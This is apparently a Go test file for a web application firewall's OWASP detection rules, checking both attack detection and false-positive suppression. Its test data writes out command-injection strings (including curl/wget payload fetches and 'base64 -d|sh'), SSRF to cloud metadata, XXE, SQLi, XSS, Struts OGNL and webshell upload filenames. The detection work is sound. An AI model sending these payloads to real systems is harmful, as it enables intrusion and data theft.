package owasp

import (
	"strings"
	"testing"
)

func TestPathContainsTreePrefixUsesSegmentBoundaries(t *testing.T) {
	cases := []struct {
		path, prefix string
		want         bool
	}{
		{path: "/restapi/soa2/collect", prefix: "/restapi/soa2", want: true},
		{path: "/api/restapi/soa2/events", prefix: "/restapi/soa2", want: true},
		{path: "/restapi/soa20/collect", prefix: "/restapi/soa2", want: false},
		{path: "/web/common-extra", prefix: "/web/common", want: false},
		{path: "/cdn-cgi/rum", prefix: "/cdn-cgi/", want: true},
		{path: "/g/collector", prefix: "/g/collect", want: false},
		{path: "/g/collect", prefix: "/g/collect", want: true},
	}
	for _, tc := range cases {
		if got := pathContainsTreePrefix(tc.path, tc.prefix); got != tc.want {
			t.Fatalf("pathContainsTreePrefix(%q, %q) = %v, want %v", tc.path, tc.prefix, got, tc.want)
		}
	}
}

func TestOWASPBodySkipPathsRespectSegmentBoundaries(t *testing.T) {
	body := []string{"test|whoami"}
	if hits := CheckOWASP("mid", "/restapi/soa2/collect", "", nil, body); hasCategory(hits, CatCmdInject) {
		t.Fatalf("/restapi/soa2/ body command payload should be skipped, got %+v", hits)
	}
	if hits := CheckOWASP("mid", "/restapi/soa20/collect", "", nil, body); !hasCategory(hits, CatCmdInject) {
		t.Fatalf("near-miss /restapi/soa20/ must not inherit body command skip, got %+v", hits)
	}
	if hits := CheckOWASP("mid", "/web/common-extra", "", nil, body); !hasCategory(hits, CatCmdInject) {
		t.Fatalf("near-miss /web/common-extra must not inherit body command skip, got %+v", hits)
	}

	ssrfBody := []string{"url=file:///127.0.0.1/admin"}
	if hits := CheckOWASP("mid", "/cdn-cgi/rum", "", nil, ssrfBody); hasCategory(hits, CatSSRF) {
		t.Fatalf("/cdn-cgi/ body SSRF payload should be skipped, got %+v", hits)
	}
	if hits := CheckOWASP("mid", "/cdn-cgix/rum", "", nil, ssrfBody); !hasCategory(hits, CatSSRF) {
		t.Fatalf("near-miss /cdn-cgix/ must not inherit body SSRF skip, got %+v", hits)
	}

	sqliBody := []string{"id=1' OR 1=1--"}
	if hits := CheckOWASP("mid", "/g/collect", "", nil, sqliBody); hasCategory(hits, CatSQLi) {
		t.Fatalf("/g/collect body SQLi payload should be skipped, got %+v", hits)
	}
	if hits := CheckOWASP("mid", "/g/collector", "", nil, sqliBody); !hasCategory(hits, CatSQLi) {
		t.Fatalf("near-miss /g/collector must not inherit body SQLi skip, got %+v", hits)
	}
}

func TestCheckOWASP_SSRF_Metadata(t *testing.T) {
	hits := CheckOWASP("mid", "/fetch", "url=http://169.254.169.254/latest/meta-data/", nil, nil)
	if !hasCategory(hits, CatSSRF) {
		t.Fatal("expected SSRF hit for cloud metadata endpoint")
	}
}

func TestCheckOWASP_SSRF_FileScheme(t *testing.T) {
	hits := CheckOWASP("mid", "/", "u=file:///etc/passwd", nil, nil)
	if !hasCategory(hits, CatSSRF) && !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected SSRF or path traversal hit")
	}
}

func TestCheckOWASP_CmdInjection(t *testing.T) {
	hits := CheckOWASP("mid", "/ping", "host=8.8.8.8;cat /etc/passwd", nil, nil)
	if !hasCategory(hits, CatCmdInject) && !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected command injection hit")
	}
}

func TestCheckOWASP_CmdInjection_Backtick(t *testing.T) {
	hits := CheckOWASP("high", "/", "q=`whoami`", nil, nil)
	if !hasCategory(hits, CatCmdInject) {
		t.Fatal("expected command injection for backtick")
	}
}

func TestHasCmdIndicatorSkipsBrowserUASeparators(t *testing.T) {
	input := "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/114.0.0.0 safari/537.36"
	if hasCmdIndicator(input) {
		t.Fatal("browser UA separators without shell command words should not enter cmd injection regex scan")
	}
}

func TestHasCmdIndicatorKeepsCommandEntrypoints(t *testing.T) {
	inputs := []string{
		"host=8.8.8.8;id",
		"test|whoami",
		"`whoami`",
		"q=$(whoami)",
		"cmd=cat${ifs}/etc/passwd",
		"input=test&&whoami",
		"out=1>>/tmp/x",
		"file=%00id",
		"line=ok\nid",
		"curl http://example.test/payload.sh",
		"wget http://example.test/payload.sh",
		"w``hoami",
		"w`h`o`a`m`i",
		"<!--#exec cmd=\"id\"-->",
	}
	for _, input := range inputs {
		if !hasCmdIndicator(input) {
			t.Fatalf("expected command indicator for %q", input)
		}
	}
}

func TestHasCmdIndicatorSkipsPlainAssignments(t *testing.T) {
	inputs := []string{
		"id=5",
		"sort=name",
		"PATH=/tmp value",
		"token=abc123",
	}
	for _, input := range inputs {
		if hasCmdIndicator(input) {
			t.Fatalf("plain assignment %q should not enter cmd injection regex scan", input)
		}
	}
}

func TestShouldScanCmdPatternPrefilterHighFrequencyRules(t *testing.T) {
	tests := []struct {
		id    string
		input string
		want  bool
	}{
		{id: "owasp:cmd:007", input: "host=8.8.8.8;id;", want: true},
		{id: "owasp:cmd:007", input: "font-family: Arial; color: red", want: false},
		{id: "owasp:cmd:010", input: "PATH=/tmp whoami", want: true},
		{id: "owasp:cmd:010", input: `{"val_nm":"ad34","val_act":"exposure_yw","channel":""}`, want: false},
		{id: "owasp:cmd:015", input: "echo abc|base64 -d|sh", want: true},
		{id: "owasp:cmd:015", input: "echo abc|base64\t-d|sh", want: true},
		{id: "owasp:cmd:015", input: "a|b|c", want: false},
	}
	for _, tt := range tests {
		pattern, ok := findCmdPatternForTest(tt.id)
		if !ok {
			t.Fatalf("missing command pattern %s", tt.id)
		}
		if got := shouldScanCmdPattern(tt.input, pattern, nil); got != tt.want {
			t.Fatalf("shouldScanCmdPattern(%s, %q, nil) = %v, want %v", tt.id, tt.input, got, tt.want)
		}
	}
}

func TestCheckOWASP_CmdInjectionHighFrequencyPrefilterKeepsAttacks(t *testing.T) {
	tests := []string{
		"host=8.8.8.8;id;",
		"echo abc|base64 -d|sh",
	}
	for _, input := range tests {
		hits := CheckOWASP("mid", "/cmd", input, nil, nil)
		if !hasCategory(hits, CatCmdInject) {
			t.Fatalf("expected command injection hit for %q, got %+v", input, hits)
		}
	}
}

func findCmdPatternForTest(id string) (owaspPattern, bool) {
	for _, p := range cmdInjectPatterns {
		if p.id == id {
			return p, true
		}
	}
	return owaspPattern{}, false
}

func TestCheckOWASP_XXE(t *testing.T) {
	payload := `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
	hits := CheckOWASP("mid", "/", "xml="+payload, nil, nil)
	if !hasCategory(hits, CatXXE) && !hasCategory(hits, CatSSRF) && !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected XXE, SSRF, or path traversal hit")
	}
}

func TestCheckOWASP_LDAP(t *testing.T) {
	hits := CheckOWASP("mid", "/login", "user=*)(objectclass=*", nil, nil)
	if !hasCategory(hits, CatLDAPI) {
		t.Fatal("expected LDAP injection hit")
	}
}

func TestCheckOWASP_NoSQLi(t *testing.T) {
	hits := CheckOWASP("mid", "/api/users", `filter={"$where": "this.password == 'a'"}`, nil, nil)
	if !hasCategory(hits, CatNoSQLi) {
		t.Fatal("expected NoSQL injection hit")
	}
}

func TestCheckOWASP_TemplateInjection(t *testing.T) {
	hits := CheckOWASP("mid", "/", "name={{7*7}}", nil, nil)
	if !hasCategory(hits, CatTmplInject) {
		t.Fatal("expected template injection hit")
	}
}

func TestCheckOWASP_TemplateInjection_Jinja(t *testing.T) {
	hits := CheckOWASP("mid", "/", "n={{''.__class__.__mro__}}", nil, nil)
	if !hasCategory(hits, CatTmplInject) {
		t.Fatal("expected SSTI hit for jinja mro")
	}
}

func TestCheckOWASP_ProtocolViolation_Smuggling(t *testing.T) {
	headers := map[string]string{
		"Content-Length":    "10",
		"Transfer-Encoding": "chunked",
	}
	hits := CheckOWASP("mid", "/", "", headers, nil)
	if !hasCategory(hits, CatProtoViol) {
		t.Fatal("expected protocol violation for CL+TE smuggling")
	}
}

func TestCheckOWASP_ProtocolViolation_MixedCaseHeaders(t *testing.T) {
	headers := map[string]string{
		"content-length":    "10",
		"TRANSFER-ENCODING": "chunked",
	}
	hits := CheckOWASP("mid", "/", "", headers, nil)
	if !hasCategory(hits, CatProtoViol) {
		t.Fatalf("expected protocol violation for mixed-case CL+TE smuggling, got %+v", hits)
	}
}

func TestCheckOWASP_ProtocolViolation_CanBeDisabledByCategorySensitivity(t *testing.T) {
	headers := map[string]string{
		"Content-Length":    "10",
		"Transfer-Encoding": "chunked",
	}
	hits := CheckOWASP("mid", "/", "", headers, nil, map[string]string{"protocol_violation": "off"})
	if hasCategory(hits, CatProtoViol) {
		t.Fatalf("expected protocol_violation category to be disabled, got %+v", hits)
	}
}

func TestCheckOWASP_ProtocolViolation_OversizedHeader(t *testing.T) {
	headers := map[string]string{
		"X-Trace-Id": strings.Repeat("a", 8200),
	}
	hits := CheckOWASP("mid", "/", "", headers, nil)
	if !hasCategory(hits, CatProtoViol) {
		t.Fatalf("expected protocol violation for oversized header, got %+v", hits)
	}
}

func TestCheckFileUpload_DangerousExt(t *testing.T) {
	hit, ok := CheckFileUpload("shell.php", "image/jpeg")
	if !ok || hit.Category != CatFileUpload {
		t.Fatal("expected file upload hit for .php extension")
	}
}

func TestCheckFileUpload_DoubleExt(t *testing.T) {
	hit, ok := CheckFileUpload("malware.php.jpg", "image/jpeg")
	if !ok || hit.Category != CatFileUpload {
		t.Fatal("expected file upload hit for double extension")
	}
}

func TestCheckFileUpload_Clean(t *testing.T) {
	_, ok := CheckFileUpload("photo.jpg", "image/jpeg")
	if ok {
		t.Fatal("clean image upload should not trigger")
	}
}

func TestCheckFileUpload_NullByte(t *testing.T) {
	hit, ok := CheckFileUpload("file.jpg%00.php", "")
	if !ok || hit.Category != CatFileUpload {
		t.Fatal("expected null byte detection")
	}
}

func TestCheckFileUpload_SemicolonDoubleExtension(t *testing.T) {
	hit, ok := CheckFileUpload("shell.php;.jpg", "image/jpeg")
	if !ok || hit.RuleID != "owasp:upload:002" {
		t.Fatalf("semicolon double extension hit = %#v, want owasp:upload:002", hit)
	}
}

func TestCheckFileUpload_DoesNotCollapseInternalSpaces(t *testing.T) {
	for _, filename := range []string{"report.p h p.jpg", "manual.phpunit.jpg", "manual.php-docs.jpg", "notes;draft.txt", "report: Q1.jpg"} {
		if hit, ok := CheckFileUpload(filename, "image/jpeg"); ok {
			t.Fatalf("clean filename %q matched %#v", filename, hit)
		}
	}
}

func TestCheckRawMultipartFilenames_SemicolonDoubleExtension(t *testing.T) {
	body := []byte("Content-Disposition: form-data; name=\"uploaded\"; filename=\"shell.php;.jpg\"\r\n")
	hit, ok := CheckRawMultipartFilenames(body)
	if !ok || hit.RuleID != "owasp:upload:002" {
		t.Fatalf("raw semicolon double extension hit = %#v, want owasp:upload:002", hit)
	}
}

func TestCheckRawMultipartFilenames_NullByteSamples(t *testing.T) {
	for _, filename := range []string{"info.php\x00.jpg", "111.php\x00.png"} {
		body := []byte("Content-Disposition: form-data; name=\"uploaded\"; filename=\"" + filename + "\"\r\n")
		hit, ok := CheckRawMultipartFilenames(body)
		if !ok || hit.RuleID != "owasp:upload:001" {
			t.Fatalf("raw null-byte filename %q hit = %#v, want owasp:upload:001", filename, hit)
		}
	}
}

// 增强的 SQLi 特征
func TestCheckOWASP_SQLi_Boolean(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 or 1=1", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for boolean tautology")
	}
}

func TestCheckOWASP_SQLi_ErrorBased(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 and extractvalue(1,concat(0x7e,version()))", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for extractvalue error-based")
	}
}

// 增强的 XSS 特征
func TestCheckOWASP_XSS_SVG(t *testing.T) {
	hits := CheckOWASP("mid", "/", "q=<svg onload=alert(1)>", nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for SVG vector")
	}
}

func TestCheckOWASP_XSS_DataURL(t *testing.T) {
	hits := CheckOWASP("mid", "/", "url=data:text/html,<script>alert(1)</script>", nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for data URL")
	}
}

// 确保 localhost 的 Host 请求头不引发 SSRF 误报。
func TestCheckOWASP_SSRF_LocalhostHostHeader(t *testing.T) {
	headers := map[string]string{
		"Host":            "127.0.0.1",
		"Accept":          "text/html",
		"Accept-Language": "en-US",
	}
	hits := CheckOWASP("high", "/abcdefg/hijklmn/a.html", "", headers, nil)
	if hasCategory(hits, CatSSRF) {
		t.Fatal("Host header 127.0.0.1 should not trigger SSRF — it is a standard request attribute")
	}
}

// 确保真实载荷（查询串）中的 localhost 仍被 SSRF 检出。
func TestCheckOWASP_SSRF_LocalhostInPayload(t *testing.T) {
	hits := CheckOWASP("high", "/", "url=http://127.0.0.1/admin", nil, nil)
	if !hasCategory(hits, CatSSRF) {
		t.Fatal("expected SSRF hit for localhost in query payload")
	}
}

func TestCheckOWASP_CmdInjection_InBody(t *testing.T) {
	hits := CheckOWASP("mid", "/", "", nil, []string{"test|whoami"})
	if !hasCategory(hits, CatCmdInject) {
		t.Fatal("expected cmd injection hit in body target")
	}
}

func TestCheckOWASP_SQLi_InBody(t *testing.T) {
	hits := CheckOWASP("mid", "/", "", nil, []string{"1' OR 1=1--"})
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit in body target")
	}
}

func TestCheckOWASP_XSS_InBody(t *testing.T) {
	hits := CheckOWASP("mid", "/", "", nil, []string{"<script>alert(1)</script>"})
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit in body target")
	}
}

func TestCheckOWASP_Base64_TemplateInjection(t *testing.T) {
	// "e3sgMzMzMSozMzMwIH19" base64 解码为 "{{ 3331*3330 }}"
	hits := CheckOWASP("mid", "/", "retain=e3sgMzMzMSozMzMwIH19", nil, nil)
	if !hasCategory(hits, CatTmplInject) {
		t.Fatal("expected template injection from base64-encoded payload")
	}
}

func TestCheckOWASP_HTMLEntity_XSS(t *testing.T) {
	hits := CheckOWASP("mid", "/", "q=&#60;script&#62;alert(1)&#60;/script&#62;", nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit from HTML entity encoded payload")
	}
}

func TestCheckOWASP_CookieInjection(t *testing.T) {
	headers := map[string]string{
		"Cookie": "session=abc123def456; lang=<script>alert(1)</script>",
	}
	hits := CheckOWASP("mid", "/", "", headers, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit from cookie value")
	}
}

func TestCheckOWASP_CookieSessionIDSkipped(t *testing.T) {
	headers := map[string]string{
		"Cookie": "SESSIONID=9a5c9c052176b6d17d8936cd2b7e942fbebeed81e12dda6e285481bca18c2d62",
	}
	hits := CheckOWASP("mid", "/api/v1/users", "", headers, nil)
	if len(hits) > 0 {
		t.Fatal("session ID cookie should not trigger any detection")
	}
}

func TestCheckOWASP_BlazeFalsePositive_TSXImport(t *testing.T) {
	hits := CheckOWASP("high", "/run", "file=demo.tsx", nil, []string{"import type { MenuProps } from 'antd'; import { Dropdown } from 'antd';"})
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("TSX import snippet should not trigger SQLi, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_PerformanceBeaconScriptWord(t *testing.T) {
	hits := CheckOWASP("high", "/web/performance", `param={"val_url":"https://open.163.com/newview/search/for power, binary<script is incorrect","performance":true}`, nil, nil)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("telemetry URL text containing '<script' should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_AdminUpstreamLocalhost(t *testing.T) {
	headers := map[string]string{"Content-Type": "application/json"}
	body := []string{"{\"upstreams\":[\"http://127.0.0.1:8889\"],\"server_names\":[\"1111\"]}"}
	hits := CheckOWASP("high", "/api/Website", "", headers, body)
	if hasCategory(hits, CatSSRF) {
		t.Fatalf("admin upstream config should not trigger SSRF, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeOpaqueEncodedBodyWithoutContentType(t *testing.T) {
	raw := "qSKqCpjt2Khc2zp3xWlArathZXZB3kZwxj3fvikMvpxI5+g7xgkuPnyZlAa5DN9U9solP15s9JWe6WKDTdOrc8kw0EOTAtkuR+lZMWsETMkmDg6t2Pvo2UyjDM0nAuNHhj6SwP/6qnqUIrborod5T4GQrBa7jPeGVAkRHWmxUck+o76fkJeJlCTcJfEkjM1GmDZbycXWyHQs3NeBeXCKCVKiJ1wxlfyrh7xv+e3gIVTr6fnd/8FW5bFtXBAyNdycLyAbUr6TderOfYXV18501EENBsCxA4hj+IabICZ5Ro+AlaqYHeRt3CTX1F6t2r5D9snHpg8eyYcPog8ZJmzdDQrK3kzfX7aJKILHr2yOzB8cwdi22aeBRDCu94nhlvlR7fVefFUjzOvEQyA9LZ2UCtIjFvvISe2MVXM6OYalvXdFnbw6jJCRfrfO3gu8IAtJFuYb6p8tfGNVZk59rHM2yXGVw+pR66djbiDEz0VFABoeiZPB0VG76hB5szYEfwNvgYUWEQZaQKvp/gvI3+ckwNcwK8qQc0RVshQTuQs/jRcjVDR7hhEWC8+u1DZergAaV89Hf9FZzFuQzAn3Q/Bt7XVP2yyAI7Nke+aFgNDb6jl8CosvA722yIAim92Valte/0vxxbqXekVL5i05WOgRYmBjvfhseIIXYyHbHNGRlQnvkbNBNSONtLZUrUs+gzkOIpOaW+3XPF2SNKGcaJB6Gbft2YULbFbzUEPDAcpj399tQlZ3JH38iLd0jf8DITCvkIB6cOTREj6MmfEYMSSU2Wbp8fgMZAKY107yUzQpeUTHyj3ytAgwvXKLfCvhm98xGcksMQHMkBco4LcO6X9A7mazaIRsXsi5fALdGG1BfcTIohXAINmt/Ka4bIIBrqx/DXqu3UAjPsyTqnJgbuBdJxxFvsZCgYKgmR3lUJot1wpHayrIzoAKQcE3mGRnyksyXIYVxkyxrheMsQZKRhNv+X2BjJMxntw21pCiRsUxtg0RfixBQtOMO/kTOi4QcdLqtCFOUEtwOG//1LADFRxj1VQS03BMUFj4GjwCbwjSWRmT6rJO2QRCZemLVQLpH4fEzRLbPuQG8rzMQfh4NhaOyvQlxiLEmvtyzZ/AtxQ8/t/sQ5g2t9LhWDQgiwVGw8IzvBSXzxoIn7LwCgVQq1drjF2s7pB2R0nJL41jP4SLgEC8e60voCBV88eBCDv6SHgBhEeSyrBtG1nXMfDbUujJIapZlmIhDROEfgcozAna10KXDxzv7l5YgPBv9ENDAbhhUVOh3+Yd8xjGD11sEy2I0JzHRcIvVNl4N+/FQm5cITdlLGjyl7BDKP5cd5IPTqiQzb0zvnBIhZQ6EOHEa21v6F8opRUDRx0/5Zq6AxPW2i+bH5lHjj69zwf9pK2FBUAdQ1AcNisgkkRUgKJAJVbr0eITvkdTrU5xlgysjLntSUnbMjs89YiFz4RtJGSViToJ2VVrfsH2mzKL+0C3GLkm6WDxI0kg8cEHn8WC/yla9w3CYbEKL7E0l1dqw2uekyK6OtUBgkXIkCRbvHCERFAtMEScBfWHTId3awys//Q/Vs7qTbHT+wsECpN/kvOkxyw+"
	hits := CheckOWASP("high", "/uc/feedback/api/v1/pc/feedback/add", "", map[string]string{"Host": "10.10.3.128:2280"}, []string{raw})
	if !hasCategory(hits, CatProtoViol) {
		t.Fatalf("opaque long base64-like body without content-type should trigger protocol violation, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_CodePenInlineScript(t *testing.T) {
	body := []string{"https://codepen.io https://cpwebassets.codepen.io <script src=\"https://cpwebassets.codepen.io/assets/editor/iframe/iframeConsoleRunner.js\"></script> React.createElement createRoot preventDefault target=\"_blank\""}
	hits := CheckOWASP("high", "/cpe/boomboom/store", "", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("CodePen editor payload should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_AnalyticsJavascriptVoid0(t *testing.T) {
	body := []string{"{\"attributes\":\"{\\\"href\\\":\\\"javascript: void(0);\\\"}\"}"}
	hits := CheckOWASP("high", "/analytics/v2_upload", "appkey=0WEB0OEX9Y4SQ244", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("analytics beacon javascript:void(0) should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_BingCSPJavascriptVoid0(t *testing.T) {
	body := []string{"[{\"body\":{\"sample\":\"javascript:void(0);\"}}]"}
	hits := CheckOWASP("high", "/api/report", "cat=bingcsp", map[string]string{"Content-Type": "application/reports+json"}, body)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("bing csp report javascript:void(0) should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_BingGLinkPingPostJavascriptVoid0(t *testing.T) {
	hits := CheckOWASP("high", "/fd/ls/GLinkPingPost.aspx", "IG=BD260740AF264E0F93C3C3F2866590BC&ID=SERP,5036.1&url=javascript%3Avoid(0)%3B", map[string]string{"Content-Type": "text/plain;charset=UTF-8"}, nil)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("bing GLinkPingPost javascript:void(0) should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_LogstoreWindowLocation(t *testing.T) {
	body := []string{"{\"value\":\"function(e){var n=new URL(window.location.href);Array.from(document.querySelectorAll('.x'))}\"}"}
	hits := CheckOWASP("high", "/logstores/prod/track", "", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("logstore frontend code should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_LogstoreEmbeddedSVG(t *testing.T) {
	body := []string{"{\"value\":\"<svg t=\\\"1682594285904\\\" class=\\\"icon\\\" viewBox=\\\"0 0 1024 1024\\\" xmlns=\\\"http://www.w3.org/2000/svg\\\"></svg> function(t){e(t)} document.querySelectorAll('.x')\"}"}
	hits := CheckOWASP("high", "/logstores/prod/track", "", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("logstore embedded svg/ui code should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_POCRelativePathYAML(t *testing.T) {
	body := []string{"{\"code\":\"name: poc-yaml\\ntransport: http\\npath: /IND780/excalweb.dll?webpage=../../AutoCE.ini\"}"}
	hits := CheckOWASP("high", "/api/v2/xray/poc/create/", "", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatPathTrav) {
		t.Fatalf("poc editor relative path should not trigger path traversal, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_SpeedTelemetryURLQuery(t *testing.T) {
	body := []string{"payload=https://localhost.sec.qq.com:9410/?cmd=101&service=1&id=abc&from=https%3A%2F%2Fqzone.qq.com%2F"}
	hits := CheckOWASP("high", "/speed", "id=RiaWqsnT3403yXTgVY", map[string]string{"Content-Type": "multipart/form-data"}, body)
	if hasCategory(hits, CatPathTrav) {
		t.Fatalf("speed telemetry urlquery should not trigger path traversal, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_RunReactCode(t *testing.T) {
	body := []string{"createRoot(document.getElementById('container')).render(<Demo />); <a onClick={(e) => e.preventDefault()}>"}
	hits := CheckOWASP("high", "/run", "file=demo.tsx", map[string]string{"Content-Type": "application/x-www-form-urlencoded"}, body)
	if hasCategory(hits, CatXSS) || hasCategory(hits, CatCmdInject) {
		t.Fatalf("stackblitz react code should not trigger xss/cmd, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_NewsTelemetryAdScript(t *testing.T) {
	body := []string{"<div class=\"row_ad\"><script type=\"text/javascript\">var winWidth = window.innerWidth || document.documentElement.clientWidth; document.querySelector('#box').style.display='block';</script><script src=\"https://cpro.baidustatic.com/cpro/ui/cm.js\"></script><iframe src=\"https://pos.baidu.com/nclm\"></iframe>"}
	hits := CheckOWASP("high", "/news/g", "", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("news telemetry ad script should not trigger XSS, got %+v", hits)
	}
}

// TestCheckOWASP_StrictSuppressesNonExecutableXSSStructures 锁定「无执行语义」
// 的结构型抑制在 strict / very_high 档位同样生效。
//
// 背景：strict 档位此前绕过了全部 XSS 误报抑制，导致真实业务流量被误判——
// 分析类 JSON 里的 javascript:void(0)、新闻页的被动 iframe、图标 SVG、
// JSX 演示代码都被计为攻击（线上 :3030 评测 22 条误报全部来自这些形态）。
// 本组用例固定「任何档位都不应命中 XSS」的期望。
func TestCheckOWASP_StrictSuppressesNonExecutableXSSStructures(t *testing.T) {
	cases := []struct {
		name  string
		path  string
		query string
		body  []string
	}{
		{
			name:  "analytics javascript void",
			path:  "/analytics/v2_upload",
			query: "appkey=0WEB0OEX9Y4SQ244",
			body:  []string{`{"attributes":"{\"href\":\"javascript: void(0);\"}"}`},
		},
		{
			name:  "bing ping javascript void",
			path:  "/fd/ls/GLinkPingPost.aspx",
			query: "IG=BD26&SERP=1&url=javascript%3Avoid(0)%3B",
		},
		{
			name: "jsx inline handler",
			path: "/cpe/process",
			body: []string{`const App = () => (<a onClick={(e) => e.preventDefault()}><Space>Hover me</Space></a>);const { createRoot } = ReactDOM;createRoot(mountNode).render(<App />);`},
		},
		{
			name: "passive iframe embed",
			path: "/news/g",
			body: []string{`<div><iframe id="iframeu6864722_1" name="iframeu6864722_1" src="https://pos.baidu.com/nclm" width="300" height="250"></iframe></div>`},
		},
		{
			name: "passive svg icon",
			path: "/logstores/prod/track",
			body: []string{`{"icon":"<svg t=\"1682594285904\" class=\"icon\" viewBox=\"0 0 1024 1024\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M0 0\"/></svg>"}`},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			for _, sens := range []string{"strict", "very_high", "high", "mid"} {
				hits := CheckOWASP(sens, tc.path, tc.query, nil, tc.body)
				if hasCategory(hits, CatXSS) {
					t.Fatalf("%s: %s 档不应命中 XSS，got %+v", tc.name, sens, hits)
				}
			}
		})
	}
}

// TestCheckOWASP_StrictStillDetectsExecutableXSS 锁定同一抑制逻辑不会放过
// 具备执行语义的载荷：JSX 取值区、裸事件处理器赋值、伪协议调用与被动标签
// 内的主动上下文都必须继续在 strict 档位命中。
func TestCheckOWASP_StrictStillDetectsExecutableXSS(t *testing.T) {
	cases := []string{
		`<svg onload=alert(1)>`,
		`<iframe src=javascript:alert(1)>`,
		`<a onclick={alert(1)}>x</a>`,
		`<div onclick={()=>fetch('//evil')}>x</div>`,
		`<a onclick={()=>{location='//evil'}}>x</a>`,
		`javascript:alert(document.cookie)`,
		`<a onclick={(e)=>e.preventDefault()} onmouseover=alert(1)>x</a>`,
	}
	for _, payload := range cases {
		hits := CheckOWASP("strict", "/", "", nil, []string{payload})
		if !hasCategory(hits, CatXSS) {
			t.Fatalf("strict 档应命中可执行载荷 %q，got %+v", payload, hits)
		}
	}
}

func TestCheckOWASP_BlazeFalsePositive_CTripJavaDeserializeMessage(t *testing.T) {
	body := []string{"Cannot deserialize instance of java.util.ArrayList<java.lang.Integer> out of VALUE_STRING token; resource.c-ctrip.com load success"}
	hits := CheckOWASP("high", "/bee/collect", "", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatWebshell) {
		t.Fatalf("ctrip deserialize error text should not trigger webshell, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalseNegative_QueryValueBase64UnionSelect(t *testing.T) {
	hits := CheckOWASP("high", "/", "multi=register&prepare=encapsulate&report=TlM4cUlHRndjR1Z1WkdOdmJXMWxiblJ6Y25OelptVmhkSFZ5WldOeVpXVndZMkZqYUdWamIyNTBZV2x1YzJSeVlXZHZibVpzZVcxaGRHTm9kbTlwWkdSd1kyME5hbk52Ym1sdGNHOXlkSE5oYkdsbmJteGxablIwWVdKcGJtUmxlSEpsWTNSemMyTnliMnhzWW1GeURRMGdLaTlCYm1RTk5Rb2pJR1psWkc5eVlXRm1kR1Z5Ym05dmJtWnZjbU5sWkc1aGRHbDJaU0FLUFNNZ1pHRjBaWFJwYldWd2JHRjVjMmx1WjJ4bElBb3pMeW9nWVdKemIyeDFkR1Z2Y21sbGJuUmhkR2x2Ym5WdVkyeHZjMlZrQ25CdmFXNTBjMkZ0WVhsaGIyeGtiMjVzYjJGa0lDb3ZMUzBnWTI5eWNtVmpkSE5yZVhCbGNHeGhlWE4wWVhScGIyNXdjbVZtWlhKeVpXUnZjSFJuY205MWNHbHVkR1Z5ZG1Gc1pYaHdZVzVrYjJOb1lXNW5aV1J5WlhGMVpYTjBaV1FnQ25WdVNVOU9MeW9nY25WdWRHbHRaWGRwYkd4d1lYSmxiblFLSUNvdlUwVk1SVU4wRFMwdElITjBhV05yZVhadmFXUnpaV04wYVc5dWMzTmhkSFZ5WkdGNVpHbHlaV04wYVhabGMyeHBjM1J1WVhScGRtVnlkV2xrWkc5MVlteGxJQW94Q2lNPQ%3D%3D", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatalf("nested base64 query payload should trigger SQLi, got %+v", hits)
	}
}

func TestCheckOWASP_StrutsOGNLRelativeRequestTarget(t *testing.T) {
	hits := CheckOWASP("high", "index.action", `redirect:${#a=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#b=#a.getRealPath("/"),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#b)}`, nil, nil)
	if !hasCategory(hits, CatExprLang) {
		t.Fatalf("relative Struts OGNL request target should trigger expression-language detection, got %+v", hits)
	}
}

